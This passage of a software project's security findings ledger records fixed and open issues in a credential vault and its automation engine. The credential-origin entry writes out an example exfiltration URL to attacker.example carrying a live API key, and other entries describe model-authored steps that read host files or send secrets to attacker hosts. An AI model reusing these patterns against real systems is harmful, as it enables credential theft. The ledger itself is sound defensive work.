  Verification is the next CI run on push; the local equivalent (`rm -rf shared/dist && npm run
  build --workspace shared && npm run typecheck`) is green.
- **`main-typecheck-red-9-errors`** (FIXED 2026-07-28, MEDIUM, correctness — the errors
  `ci-typecheck-never-ran` was hiding). Nine `tsc` errors on clean `main` at `619277b`, all landed
  by recent Cofre work: (a) `scripts/migrate/ciphertext-v2.ts` imported a non-existent export — see
  `k4-migration-dead-on-arrival`, which is the more serious half; (b) `tests/bridge/revoke.test.ts`
  (x2) and `tests/fake-daemon/correlation-join.test.ts` passed a `DelegationActor` without the
  `orgId` that E-1 made REQUIRED — `integration.test.ts` was updated in that change and these two
  were missed; (c) `tests/security/page-value-leaks.test.ts` (x3) built css locators as
  `{strategy:'css', value}` where the `Locator` union requires `{strategy:'css', selector}`, so
  `describeLocator` read `undefined` and the cache content under test was `css="undefined"` — the
  assertions passed while never exercising a well-formed locator, so this was a green test proving
  less than it claimed (now also asserts the selector IS retained, since shape is what the summary
  is allowed to keep); (d) `tests/security/screenshot-masking.test.ts` (x2) indexed
  `mock.calls[0][0]` on a zero-arg `vi.fn`, whose recorded tuple type is `[]` — the `as {...}` cast
  was papering over an argument the mock's type said could not exist. All fixed; `npm run
  typecheck` is green across the three workspaces and `npm test` is 130 shared / 2555 api / 359 web.
- **`shared-suite-counted-twice`** (FIXED 2026-07-28, MEDIUM, test-integrity — found while
  verifying the `ci-typecheck-never-ran` fix). The `shared` suite collected every test TWICE — once
  from `src/`, once from the compiled `dist/` copy — so its reported size was a function of a BUILD
  ARTIFACT, not of the tests. Observed in one sitting: **5 files/130 tests** on a stale dist,
  **6/144** after a rebuild, **3/72** on a clean checkout. The true count is 3 files / 72 tests, so
  every "shared 130" in the recent commit messages was inflated by a factor of ~1.8 and the number
  moved whenever someone happened to build. Two causes, both fixed: `shared/tsconfig.json` compiled
  `src/**/*.test.ts` into the published `dist/` (tests were shipped to consumers as well as
  double-collected) — now excluded; and `shared` had no vitest config, while **Vitest 4 narrowed
  its default `exclude` to `node_modules` and `.git` only**, dropping the dist glob that older
  versions excluded — now `shared/vitest.config.ts` pins `include: src/**/*.test.ts` and restores
  the dist exclusion. `api/` and `web/` were never affected: their builds emit no test files.
  Verified stable at 3/72 across a clean build, a rebuild and a full-lane run. Worth noting for
  anyone auditing the ledger: a census that quotes counts is only as trustworthy as the collection
  behind it, and this one silently changed under a minor-version default.
- **`k4-migration-dead-on-arrival`** (FIXED 2026-07-29, MEDIUM, correctness/governance — found by
  the A-8 typecheck sweep). `api/scripts/migrate/ciphertext-v2.ts` is journaled as landed (commit
  `f993d06`, `docs/decisions.md` 2026-07-28 K-4) but **had never compiled and has never run**. It
  imported `cofreItems` from `src/data/stores.js`, which does not export it — the Cofre item store
  lives in `src/cofre/store.ts`, which exports `__cofreItemsStoreForMigration` for exactly this
  caller. FIXED here only to the extent the red baseline demanded: the import is corrected and the
  file now typechecks. Still OPEN, and this is the part that matters — the migration is **not
  wired and not proven**: (a) nothing registers it in `api/scripts/migrate/cli.ts`, so there is no
  way to invoke it; (b) the `gate:crypto-version` script the decision entry names does not exist in
  `package.json`; (c) it has no test, so `module_tests` never covered it. The consequence is that
  the v1 weakness the entry claims K-4 removes — a v1 row is under the flat global key and decrypts
  under ANY tenant argument — is still fully present in any deployed database, and the journal says
  otherwise. Close by wiring the CLI entry, adding the gate script, and adding a hermetic test that
  seeds v1 rows, migrates, and asserts `noV1CiphertextRemains()`. Note while doing so that
  `noV1CiphertextRemains()` currently CALLS `migrateCiphertextToV2()`, so the "check" mutates the
  database — safe because the migration is idempotent, but a gate that writes is the wrong shape
  and should be split into a read-only scan. **CLOSED 2026-07-29**: scan and migrate are now
  separate (`scanCiphertextVersions()` is read-only, so the post-cutover gate can be pointed at
  production to ask a question); `api/scripts/migrate/ciphertext-v2-cli.ts` is the entry point,
  dry-run by default with `--execute` required to write (ch10 §10.3 rule 3); `migrate:ciphertext-v2`
  and `gate:crypto-version` are wired in `api/package.json`, the latter exiting non-zero while any
  v1 row remains so it can gate CI after the cutover window. Proven by
  `api/tests/security/ciphertext-v2-migration.test.ts` (9 cases, both plants red) AND by driving the
  real CLI against an ephemeral mongo: gate exit 1 with a seeded v1 row -> `--execute` reports
  COMPLETE -> gate exit 0. The decisive test is not "the row changed shape" but "the row can no
  longer be decrypted under the WRONG tenant", which is the property K-1 only gave to new writes.
- **`cofre-raw-store-lint-rule-missing`** (FIXED 2026-07-29, LOW, defence-in-depth — found by the
  A-8 sweep). Plan item B-1 specified "an eslint rule forbidding any import of the raw `cofre_items`
  store handle outside `api/src/cofre/`, and forbidding re-derivation of the scoping predicate".
  No such rule exists in `.eslintrc.cjs` — the module-direction zone array lists `./api/src/cofre`
  only as a TARGET that may not import `routes/`/`server.ts`. So the scoped-repository chokepoint
  that makes the Cofre the third `OwnerVisibilityScoped` consumer rests on convention alone, and
  `__cofreItemsStoreForMigration` (a deliberately ugly name, now imported by the migration script)
  is greppable but not enforced. Not exploitable today — the only importer is the migration — but
  the whole point of B-1's chokepoint is that it cannot be bypassed by a future caller who has not
  read the plan. FIXED: `.eslintrc.cjs` bans `**/cofre/store` outside `api/src/cofre/**`, with
  `api/scripts/migrate/**` legitimately outside the rule's file set (a migration rewrites every
  tenant's rows and so cannot go through an owner-scoped repository). Worth recording HOW it was
  nearly got wrong: the first attempt added a second `no-restricted-imports` override for
  `api/src/**`, and because ESLint REPLACES rather than merges that rule per file, it silently wiped
  the `@anthropic-ai` egress ban (FIXED-3/8/13) for every non-llm file while appearing to add a
  rule — a lint config that looked stricter and was materially weaker. Both bans now live in one
  override per file set, and the llm/ and cofre/ exemptions RESTATE the ban they keep instead of
  switching the rule off. All four directions verified against planted imports.
- **`page-values-to-log-and-memory`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
  gate R-4 + R-5). Two leaks of the same class: values read off a LIVE PAGE of an authenticated
  session. (R-4) `automation/engine.ts` merged verifier-extracted values into the shared `inputs`
  map and logged them with `console.log(\`... ${k}="${v}" ...\`)` — cleartext in the process log,
  and from `inputs` they are template-substituted into downstream `api_call` URLs/headers/bodies
  whose RESOLVED form is persisted. FIXED: the log records the key and the LENGTH only, and a
  secret-shaped KEY NAME (otp/token/password/senha/sessao/credential/pin/cvv, PT-PT included) is
  refused outright so the value never joins `inputs` at all. The vocabulary is pinned in BOTH
  directions — a false positive silently refuses an ordinary input, and a bare `/auth/` matched
  `author`. (R-5) `automation/cache.ts` wrote the resolved action into ORGANIZATIONAL MEMORY at
  tier `active` through the ordinary `createMemory` surface, and `memory/resolver.ts` `isInjectable`
  excluded only `tier==='archive'` — so those rows were term-scored against the user's ordinary
  chat prompt and injected under `# Memória`. `summariseAction` put the first 40 chars of any
  `fill`, the FULL `navigate` URL and the FULL `select` value into the scored `content`, so a
  magic-link or SSO-callback URL was replayed verbatim to the chat model on term overlap. FIXED by
  a `nonMemorable` memory class that `isInjectable` now requires to be absent (structurally "not a
  memory", distinct from `tier:'archive'` which is merely user-hidden), set on every action- and
  assertion-cache row; plus de-valuing the summaries at the source — length for a `fill`, origin +
  pathname for a `navigate` (the query string is where the tokens live), no literal for a `select`
  or an assertion. The cache still works: the exact action lives structurally in `cachePayload`,
  which was never term-scored. Pinned by `api/tests/security/page-value-leaks.test.ts` (44 cases).
- **`screenshot-plane-unauthenticated`** (FIXED 2026-07-27, HIGH, confidentiality + GDPR — Cofre
  discovery gate R-3). `/automation-screenshots` was an `express.static` mount over
  `<dataDir>/automation-runs` with NO auth middleware, NO tenant check and NO expiry. The recorded
  rationale (`docs/decisions.md`, 2026-07-11) was that an `<img>` cannot carry an Authorization
  header, so "the unguessable automationId/runId path IS the capability". Two problems: the PNGs
  are screenshots of an AUTHENTICATED session on a client portal (for this product, processo
  numbers and client NIFs rendered as pixels), and the run id is not treated as a secret anywhere
  else — it travels in SSE frames, persisted step records, the run API and logs. FIXED without
  trading the control away, using the pattern the repo already applies to the SSE stream for the
  identical constraint: a short-lived platform JWT in the query string (`verifySseToken`), then a
  run lookup that checks org and ownership before a byte is streamed. Cross-tenant reads answer
  404, not 403, so existence is not an oracle; an unattributable legacy run (no `orgId`) is refused
  rather than served; path segments go through the containment resolver; non-PNG files are refused.
  The URL SHAPE is unchanged, so every persisted `screenshotUrl` keeps resolving — the web client
  appends `?token=` via the existing `withPreviewToken` helper. RETENTION: nothing ever deleted
  these PNGs (every reference in `api/src` was a write or a path builder), a GDPR erasure gap over
  an unindexed tree, so a 7-day sweeper and a `deleteRunScreenshots` erasure path land in the same
  change. Pinned by `api/tests/security/screenshot-plane.test.ts` (14 cases, including a
  traversal-escape test on the erasure path) and a REWRITTEN
  `api/tests/contract/automation-screenshots.test.ts`, which previously asserted the unauthenticated
  read as the contract.
- **`d8-oauth-custody-plane`** (AUDIT COMPLETE 2026-07-27 — the audit no discovery-gate pass
  covered). The live OAuth credential-custody plane holds refresh tokens TODAY and had received no
  verdict from any of D1-D7. Audited: `integrations/platform-oauth.ts`, `m365-proxy.ts`,
  `prefetch.ts`, `app-sso-sessions.ts`, `pipedream.ts`.

  **CONFORMS, and should be reused rather than replaced.** `platform-oauth.ts` encrypts the token
  bundle at rest through the one crypto module, refreshes on expiry and re-persists, and — the part
  worth calling out — uses a SINGLEFLIGHT per row so a rotating `refresh_token` can never be
  double-spent by a lazy refresh racing a sweep. That is a genuinely hard property and it is already
  correct. External I/O defaults to the SSRF-guarded fetcher. `connect` logs `{provider}` only.
  `m365-proxy.ts` is the CLOSEST SHIPPED ANALOGUE OF THE I9 PRIMITIVE: it forwards the Graph path
  verbatim while injecting a freshly-refreshed Bearer server-side, so the served artifact never sees
  the token — exactly the "caller names a reference, a fixed primitive executes" shape the Cofre
  needs, and WS-J should model on it. `pipedream.ts` keeps project keys in one org-scoped encrypted
  row, decrypted just-in-time and never logged/thrown/returned, behind a master toggle and a billing
  gate. `app-sso-sessions.ts` enforces artifact isolation server-side (`session.appId === canonical
  id`, never by cookie path) and its pending-auth consume is atomic (`findOneAndDelete`), so the
  no-replay property is LOCAL rather than relying on the IdP.

  **DIVERGES — the gaps that matter for the Cofre.** (1) The whole plane is a PARALLEL custody
  path: it never routes through `cofre/unwrap()`, so none of it has a grant, a lock, per-item origin
  binding, or an "item used" Registo event. A user cannot see or revoke these credentials from the
  Cofre, and "Bloquear tudo" does not touch them. (2) It uses the UNSCOPED `encrypt()`, so ciphertext
  is not org-bound — the same finding already recorded against integration credentials, under the
  same single global `ENCRYPTION_KEY`. (3) `prefetch.ts` injects OAuth-fetched email/calendar/file
  CONTENT into the chat SYSTEM PROMPT (`agents/context.ts:170`), cached per org for 60s. That is
  model-bound text and therefore IS covered by the anonymisation chokepoint (`client.ts:967-968`
  anonymises `systemPrompt` as well as `prompt`) — so I1 holds, with the honest residual that the
  coverage is only as good as the deny-list and the PT recognizers. Worth stating explicitly because
  the gate never verdicted it and a reader could reasonably have assumed otherwise.

  **CONSEQUENCE FOR B-4.** The migration should bring these rows under `unwrap()` — gaining grants,
  lock-now/lock-all and the Registo events — WITHOUT rewriting the refresh machinery, whose
  singleflight is the part that is hard to get right. `oauth_token` is already a Cofre item type.
- **`canvas-token-is-a-platform-token`** (FIXED 2026-07-27, HIGH, authentication — Cofre F-1, the
  `api/src/streaming/` security pass). The canvas (screencast) token is signed with the SAME secret
  as platform session tokens and carried NO class marker: `sub` + `jti`, no `aud`. `auth/jwt.ts`'s
  token-class guard only knew about `ekoa-bridge`, so `verifyToken` ACCEPTED a canvas token and
  returned claims with a valid `sub`/`jti` and `role`/`orgId` undefined. `requireAuth` then passed
  it end-to-end: the jti exists, it is not revoked, `getActivation(sub)` resolves for a real user,
  and `iat` is fresh. VERIFIED EMPIRICALLY with a throwaway probe before being written up, not
  inferred from a read. The consequence is not theoretical — every route that authorizes on
  `req.user.sub` ALONE never reads `role` or `orgId`, so a leaked 600-second canvas token was a
  platform bearer token for gateway-key MINT (which returns a long-lived API key), the bridge token
  endpoint, and the Cofre item routes. FIXED with the same mechanism the bridge token already used:
  `aud: 'ekoa-canvas'` minted and required on the media channel, and refused by the platform
  verifier. The guard checks `traceId` as well as `aud`, so a token minted before the audience
  landed gets no grandfathered window. Pinned by `api/tests/security/canvas-token-class.test.ts`
  (8 cases, including a validly-signed pre-audience token that exercises the traceId branch rather
  than merely failing a signature check).
- **`streaming-screencast-has-no-credential-suppression`** (OPEN, HIGH, confidentiality — Cofre F-1;
  BLOCKS F-2 and D-5). The CDP screencast in `api/src/streaming/session.ts` is a continuous JPEG
  stream of the LIVE page, and it is a SEPARATE path from the automation screenshot that H-2/H-3
  masks. `Page.startScreencast` has no mask option — Playwright's `mask` is a `screenshot()` feature
  only — so masking is not available here and SUPPRESSION is the only correct control: the
  screencast must be stopped for the duration of a typist credential window, and the typist must
  refuse to run at all if it cannot confirm the screencast is stopped. Until that lands, WS-F's
  typist must not fill a credential while a canvas session is attached. This is the specific reason
  the plan blocks F-2 on F-1, and it is now a named finding rather than a scheduling note.
- **`browser-context-leak-and-docblock-drift`** (FIXED 2026-07-27, MEDIUM, resource + accuracy —
  Cofre discovery gate G-3). `LocalBrowserSession.dispose()` closed only the PAGE, so every run
  leaked its browser context — and with it the entire cookie jar of an authenticated session — for
  the lifetime of the process. FIXED by retaining the context and closing it in `dispose()`, both
  closes best-effort so teardown never fails a completed run. SEPARATELY, the module's docblock and
  `ensurePage`'s comment described "the owner's PERSISTENT context" with concurrent runs for one
  owner sharing cookies; the composition root has always handed back `browser.newContext()`,
  ignoring the owner entirely. The divergence is safe in the direction that matters — a fresh
  isolated context per session means no cookie jar is reused across runs OR owners, which is
  stricter than the documented model — but reading the docblock instead of the composition root
  produced wrong conclusions twice during the discovery gate. The comments now describe the code as
  built, and the behaviour is pinned by test rather than asserted by comment. Pinned by
  `api/tests/security/browser-context-lifecycle.test.ts` (5 cases).
- **`planner-and-assertion-echo-page-content`** (FIXED 2026-07-27, MEDIUM, confidentiality — Cofre
  discovery gate H-6 + the H-1 assertion leg). Two messages carried content into three destinations
  each: the process log, the RETRY PROMPT sent back to the model, and the persisted record / SSE
  stream rendered to the user. (H-6) `automation/planner.ts` built a 50-character preview of an
  auth-shaped header's VALUE and interpolated it into a cross-validation violation — and the thing
  being reported is by definition a literal credential the model just wrote, so the check designed
  to stop raw tokens in headers was itself copying them into all three sinks. The sibling argv check
  echoed the whole offending argv element. Both now report a CATEGORY: the header NAME, or the argv
  POSITION. (H-1 assertion leg) `automation/executor.ts` `expect_text` echoed 200 raw characters of
  `innerText` from a page of an AUTHENTICATED session, `expect_url` echoed the full URL including
  the query string where magic-link tokens and SSO codes live, and `expect_title` echoed the title
  whole. These are the ONE live in-process DOM-text path the gate identified as reaching the
  rehearsal fixer's prompt. Now: the expectation plus a character COUNT, origin + pathname, and a
  bounded title. Pinned in `api/tests/security/credential-boundaries.test.ts`.
  NOT YET DONE, and explicitly still open: the rest of H-1 — `local_command` stdout/stderr,
  `ekoa_action` results and `extractActionRunOutput` still need the run-scoped `SecretRegistry`
  threaded through the engine, which is a structural change rather than a message fix.
- **`anonymisation-skips-the-pixel-plane`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre
  discovery gate H-2). `api/src/llm/client.ts` anonymises `prompt` and `systemPrompt` at the egress
  chokepoint (`:967-968`) and forwards `images: opts.images` VERBATIM (`:981`) — and
  `api/tests/llm/client.test.ts` PINNED that forwarding as the contract, so the gap read as
  intended behaviour. `docs/security.md` described the pipeline as covering "all model-bound text",
  which is true and false-by-omission at once: a reader took it as covering everything model-bound.
  For this product the pixels are screenshots of an AUTHENTICATED session on a court portal —
  processo numbers, client NIFs, and during a login step the credential itself. FIXED BROWSER-SIDE,
  because a Cortex-side transform on a finished PNG is OCR-and-hope: `automation/screenshot-masking.ts`
  masks credential-bearing regions by LOCATOR at capture time (so the sensitive pixels are never
  rendered into the buffer) with a SOLID mask colour, and `LocalBrowserSession` gains
  `withCaptureSuppressed()` so a credential window takes NO picture at all — a stronger guarantee
  than masking the field. The failure mode is the decisive property: a masking failure returns null,
  which the existing capture path already treats as "no screenshot this step", so it can never
  degrade to an unmasked capture. The pinning test is re-framed in place as plumbing-only and
  `docs/security.md` now states the text/pixel split, including the RESIDUAL: a screenshot still
  carries non-credential page content as untokenized pixels. Pinned by
  `api/tests/security/screenshot-masking.test.ts` (12 cases).
- **`envwhitelist-reads-cortex-env`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
  gate D4/J-4). `LocalCommandSpec.envWhitelist` was a list of environment variable NAMES accepted
  from the planner (a model) which `buildEnv` resolved against the CORTEX API SERVER's OWN
  `process.env` — provider keys, `ENCRYPTION_KEY`, `JWT_SECRET`, database credentials — and shipped
  the resolved values to a user's machine. A model-authored `envWhitelist: ["JWT_SECRET"]` was a
  complete platform compromise expressed as an ordinary step field. It never had a receiver
  (`ekoa-bridge`'s bash tool hard-scrubs the child to seven names) and `local_command` is unreachable
  end-to-end, so it was latent rather than live — but it would have gone live the moment
  `setDaemonConnectionResolver` was wired. DELETED rather than hardened, in the same change that
  adds the real primitive (`api/src/cofre/process-injection.ts`), because deletion cost nothing then
  and becomes impossible later. Pinned by `api/tests/security/i9-env-injection.test.ts` (29 cases),
  which includes a STATIC GUARD asserting the declaration and both use sites are gone.
- **`cofre-absent`** (IN PROGRESS 2026-07-27, the Cofre build itself — Cofre WS-A/WS-B/WS-C). The
  discovery gate found NO Cofre: no credential item model, no grants, no policy-lock seam, no origin
  binding as a property of a credential, no relay typing, no session store. LANDED SO FAR: the
  `shared/src/cofre.ts` vocabulary with I7 and I8 encoded as SCHEMA (a `certificate_identity` cannot
  hold a TTL grant; a signature relay cannot be constructed without a document name + hash), and
  `api/src/cofre/` with the single `unwrap()` seam — fail-closed on tenancy, an active grant, origin
  binding and existence, all checked before anything decrypts. Owner-scoped, ciphertext-only at rest,
  lock-now / lock-all, and an item view with no value field. Pinned by
  `api/tests/security/cofre-policy-lock.test.ts` (28) and `shared/src/cofre.test.ts` (28).
  STILL OPEN, in plan order: the routes and the product surfaces (WS-D, which must EXTEND the shipped
  `/settings/privacy` grants+ledger area rather than create a parallel one), the typist (WS-F, blocked
  on the `api/src/streaming/` security pass F-1), session-first storage (WS-G), the redaction pipeline's
  remaining legs (WS-H, incl. the image-plane bypass at `llm/client.ts:981` that a TEST currently pins),
  egress selection (WS-I), bridge protocol v2 + the I9 primitive (WS-J), and the KMS envelope (WS-K).
  A D8 audit of the live OAuth credential-custody plane is owed BEFORE the item model is considered
  fixed — `platform-oauth.ts`, `m365-proxy.ts`, `prefetch.ts`, `app-sso-sessions.ts` and
  `pipedream.ts` hold refresh tokens today and no audit issued a verdict on any of them.
- **`bridge-jwt-key-monoculture`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate
  R-8). `api/src/bridge/signing.ts` keyed the DelegatedTask HMAC with `loadConfig().jwtSecret` — the
  platform-wide secret that signs every user's session token — while `ekoa-bridge` stores
  `signingSecret` in a plaintext `config.json` (0600) on every paired laptop. Making delegation WORK
  therefore required placing the key behind every session in the deployment on every user's machine,
  so one compromised laptop compromised every session. Worse, NOTHING on the daemon side ever WROTE
  `signingSecret` (`pair.ts:72` only carried an existing value forward; `serve.ts:84` fell back to
  `''`), so in practice the delegated path was unusable without an operator hand-copying
  `JWT_SECRET` — the daemon's verifier refuses an empty key, so it denied every task: fail-closed,
  but for an invisible reason. FIXED by minting a PER-PAIRING secret in `registerPairing`, encrypted
  at rest, preserved across a redial (rotating would silently break a daemon holding the old one)
  and delivered to the owner on the already-authenticated `/bridge/token` exchange. `signDelegatedTask`
  / `verifyDelegatedTaskSig` take the secret as a parameter and refuse an empty one loudly — which
  also CONVERGES this signer with `ekoa-bridge/src/wire/signing.ts`, whose vendored copy parameterised
  the secret and added that guard back in 2026-07-10. A pairing with no secret is REFUSED (`denied`),
  never a fallback. Pinned by `api/tests/security/bridge-key-split.test.ts` (11 cases).
- **`bridge-revoke-unreachable`** (FIXED 2026-07-27, MEDIUM, availability of the kill switch — Cofre
  discovery gate R-9). `revokePairing` (`api/src/bridge/registry.ts:203`) implements terminal
  revocation with a tombstone that survives a redial and closes the live socket — and had NO
  production caller. It was reachable only from `api/tests/*`; the daemon's own `unpair` is
  local-only. A compromised machine could not be cut off except by deactivating the whole account.
  FIXED by mounting `DELETE /api/v1/bridge/pairings/:pairingId` (owner or org-admin — a compromised
  machine is exactly when the org's admin may need to act without the owner), answering 404 rather
  than 403 outside the caller's scope so the route is not an existence oracle, and emitting a
  metadata-only `security::bridge_pairing_revoked` Registo row.
- **`bridge-delegation-org-adopted`** (FIXED 2026-07-27, MEDIUM, tenant isolation — Cofre discovery
  gate E-1). `delegateToLocal` called `getConn(actor.userId)` with NO `expectedOrg`, and
  `DelegationActor` had no `orgId` field, so the task's org was ADOPTED from whatever connection
  resolved rather than checked. Org binding was structural on the connect and provider paths and
  adopted-not-checked on the one dispatch path that mints a SIGNED task. FIXED by carrying `orgId`
  on `DelegationActor` (bound from the run's actor, never a request body) and passing it as
  `expectedOrg`, so a pairing in another org reads as no pairing.
- **`bridge-excerpts-no-denylist`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
  Cofre discovery gate H-7). `ekoa-bridge/src/containment/resolver.ts` enforced only that the
  realpath stays inside a granted root. Containment answers "may the daemon touch this location";
  it cannot answer "should these BYTES cross Boundary 1", and they do — `engine.ts` `compose()`
  concatenates file excerpts verbatim into the provider_request body (its own comment: "The
  excerpts cross Boundary 1 here"). A user who granted a project directory containing `.env` or
  `.ssh/` had not consented to shipping their keys to a model. FIXED with a credential-bearing
  denylist applied to the REAL path, kept byte-identical to
  `api/src/security/path-containment.ts`; the two copies should be shared through the release
  artifact rather than by hand. Defence in depth only — containment remains the control.
- **`bridge-ledger-records-secrets`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
  Cofre discovery gate H-5). `AutomationLedgerRow.detail` was "the full bash command line, or the
  browser navigation target — recorded in full" per ADR-002, on an append-only, fsynced ledger that
  is forwarded to Cortex as trust-chip metadata. A secret passed as an argv literal
  (`curl -H "Authorization: Bearer …"`) or a one-time code in a URL was written to disk in
  cleartext, permanently, on the user's own machine — by the same component that must hold
  delivered secrets RAM-only. The audit requirement is "which invocation happened, and can I
  correlate two of them", not "what were the argument values", so rows now carry a SHAPE (program
  name + argument count, or origin+pathname) plus `detailHash`, a stable non-reversible correlation
  id. `detailHash` is optional in the schema so pre-H-5 ledger lines still parse instead of reading
  as corrupt. Two existing tier2 assertions pinned the verbatim detail and were updated.
- **`credential-origin-unbound`** (FIXED 2026-07-27, CRITICAL, confidentiality — Cofre discovery
  gate R-2). Credential use had NO origin binding on either HTTP path, and the path where the MODEL
  authored the destination had the WEAKER egress control. `automation/executors/api-call.ts`
  interpolated the decrypted fields of a model-supplied `authIntegrationKey` into a model-supplied
  URL behind only `guardedFetch`'s SSRF check — which by design permits every PUBLIC host — so
  `url: "https://attacker.example/?k={{integration.stripe.api_key}}"` exfiltrated a live tenant
  secret in one hop, and `rehearsal.ts` let the mid-run fixer author both fields.
  `integrations/action-executor.ts` was worse: a bare `globalThis.fetch` behind a `^https?://`
  shape check on a baseUrl written verbatim from an LLM-authored package config, with no SSRF guard
  at all. FIXED by `api/src/security/origin-binding.ts`: `credentialedFetch` /
  `assertOriginAllowed` make `allowedOrigins` a REQUIRED option and refuse an empty list, so
  "we could not determine the binding" and "any host is fine" can never share a code path. Matching
  is exact-host or parent-domain, never a suffix string (`evil-stripe.com` does not satisfy a
  binding to `stripe.com`). The api_call executor checks AFTER interpolation and BEFORE the
  request, so a refused destination never sees the credential; the refusal does not echo the
  attacker-chosen URL into the persisted record. The interim binding is derived from the
  integration's own declared base URLs via a fail-closed seam
  (`setIntegrationOriginResolver`); Cofre per-item `boundOrigins` replaces the derivation in WS-C
  without moving the enforcement point. `action-executor.ts` now also goes through `guardedFetch`.
  Pinned by `api/tests/security/origin-binding.test.ts` (20 cases) and
  `api/tests/security/api-call-origin-binding.test.ts` (8 cases through the real executor).
- **`integration-package-baseurl-unreviewed`** (OPEN, HIGH, confidentiality — raised while fixing
  R-2). A user-defined integration package's `httpConfig.baseUrl` is written VERBATIM from an
  LLM-authored `config.json` (`routes/integration-builder.ts:210` →
  `integrations/definitions.ts` `writeRuntimePackage`), and the owner's decrypted credential is
  injected into requests against it. R-2 put that path behind the SSRF guard, which stops it
  reaching internal infrastructure, but origin binding CANNOT fix it: the allowlist for a package
  is derived from the package's own declared host, so binding it to itself is tautological. A
  package that declares `baseUrl: https://attacker.example` is therefore still able to receive the
  credential it is configured with. This is a PROVENANCE problem — the fix is an approval gate on
  the declared host when a package is created or edited (and, later, the Cofre grant ceremony
  naming the host the user is consenting to). Deliberately not closed inside R-2 because it needs a
  user-facing approval surface, not a filter.
  NARROWED (not closed) 2026-08-03 by slice D3. `achieve`'s author arm can no longer be the way a
  new host enters the allow-list: the credential's egress binding is resolved BEFORE the draft
  exists and the draft's host must already be inside it, so on the declared-origin branch the
  allowed set is a PRE-IMAGE that cannot grow to fit (`authored-action.ts` check 5, plus check 8
  re-asserting it against the interpolated URL; the security suite measures the granted origins
  before and after a successful author and asserts they are identical). What remains OPEN is
  exactly what this entry names: the BUILDER SAVE path. A human at `PUT /api/v1/integration-builder/package`
  can still declare any `baseUrl` they like, because that route requires a human session and the
  fix is still an approval ceremony on the declared host, not a filter. So D3 closes the
  key-reachable half and changes nothing about the human half.
- **`ekoa-action-unsandboxed-fs`** (FIXED 2026-07-27, CRITICAL, confidentiality + integrity — Cofre
  discovery gate R-1). `resolveUserPath` in `api/src/automation/platform-primitives.ts` applied no
  containment whatsoever — `if (isAbsolute(path)) return path;`, with the comment "trust user-issued
  paths via Ekoa actions, since manifests are authored by the coding agent under our control". That
  premise is false in both directions: the recipe is MODEL-authored (I5) and `rehearsal.ts` lets the
  mid-run fixer LLM choose which capability runs. `file.read` of any absolute path put the bytes in
  `ctx.captured`, which is persisted as `capturedValues` and returned by `extractActionRunOutput`
  into the calling agent's tool result (I1/I2/I4); `file.write` was equally unrestricted. Because
  `ekoa_action` executes CLOUD-side with no daemon dependency, this ran on the API host today.
  FIXED by `api/src/security/path-containment.ts` — a copy-with-review of the daemon's ADR-001
  resolver (real-path checked, symlink-escape proof, write-safe for not-yet-created leaves) — rooted
  at a per-owner `<dataDir>/action-workspace/<orgId>/<userId>`, plus a credential-bearing denylist
  applied to the REAL path so a benign label cannot launder `~/.ssh/id_rsa`. `~` now means the
  workspace root, not the host home directory. An absolute host path is REFUSED rather than
  silently reinterpreted as root-relative (that reinterpretation was a first-cut defect of this fix,
  caught by its own test: it turned a containment breach into a confusing ENOENT).
  Pinned by `api/tests/security/action-path-containment.test.ts` (32 cases) and
  `api/tests/security/action-file-primitives.test.ts` (11 cases, through `executeRecipe`).
- **`redaction-masker-leak`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate R-6).
  Two divergent private copies of the value-keyed masker existed, each leaking in a different way,
  and BOTH silently skipped any secret shorter than four characters — the failure mode a masker must
  never have, because a value that is quietly not masked reads exactly like one that was.
  `integrations/http-template.ts`'s `maskValue` emitted `***…1234`, a persisted plaintext SUFFIX of
  every credential the platform ever proxied; `automation/executors/api-call.ts` masked to
  `<redacted>` with no leak but matched only the RAW literal, so a URL-encoded, base64 or
  JSON-escaped occurrence walked straight into the persisted step record. FIXED by
  `api/src/security/redaction.ts`: a run-scoped `SecretRegistry` substituting `[REDACTED:<handle>]`
  (no plaintext fragment, no length hint) across raw / URL-encoded / base64 / base64url /
  JSON-escaped forms, longest-value-first, case-folded above 8 chars. Both copies are now thin
  callers. Sub-3-char values are still not substituted — doing so would destroy the surrounding
  stream — but they are surfaced on `registry.unmaskable` instead of being dropped in silence.
  Pinned by `api/tests/security/redaction.test.ts` (24 cases, one per regression).
- **`citius-listener-blocked`** (OPEN, MEDIUM, correctness — 2A-S4 review). `citius` is the one
  SHIPPED user-defined listener source that is not deferred for a missing transport, and it still
  cannot poll. 2A-S4 fixed the part that belonged to the listener rail (the composition root now
  injects the automation seam into the executor the supervisor uses, guarded by a static test, and
  the poll unwraps the automation run envelope so the package's `listenerConfig` paths resolve
  against the action's own output). TWO blockers remain, neither of them the rail's and neither
  silent — the listener fails loudly on every tick with the exact reason on its failure counter:
  (1) `automationBinding.automationId` is the template placeholder `citius-<template>-template`,
  which no lookup resolves; ekoa-dev rewrote that id to the per-owner provisioned id inside the
  USER SANDBOX COPY of the package (integration-storage.ts), and ekoa-code deliberately descoped
  per-user sandbox packages, so the shipped binding never matches the org's provisioned automation
  (`managedAutomationId(orgId, key, templateKey)` — SINCE C1 (run 20260801-171149) this is 3-arg
  and returns `sha256(JSON.stringify([orgId, key, templateKey]))`; the 2-arg `citius-<template>`
  form recorded here no longer exists, and any remediation must resolve the id per-org or follow
  the `source.{integrationKey,templateKey}` provenance instead of hardcoding a literal). The failure surfaces as
  `unknown_automation: citius-notificacoes-template`. This equally breaks the automation
  `integration` step, i.e. it is NOT specific to the listener rail; two committed assertions
  currently pin the placeholder value (`api/tests/contract/integration-definitions.test.ts`,
  `api/tests/e2e/citius-integration.e2e.mjs`), so the fix (resolve the bound id via the
  deterministic managed id, or re-point the shipped package and both assertions) is a deliberate
  separate change. (2) The CITIUS captured browser session does not exist yet — `session-capture.ts`
  is track 2A slice 6 — so even a resolvable automation cannot authenticate to the Portal dos
  Mandatários. Close with 2A-S6 plus the id fix.
- **`event-array-field-shape-drift`** (OPEN, LOW, correctness — 2A-S4 review note). Both poll
  sources treat a non-array `eventArrayField` as an empty batch (`asArray` returns `[]`), so a
  provider that changes the shape of that field advances the cursor over items that were never
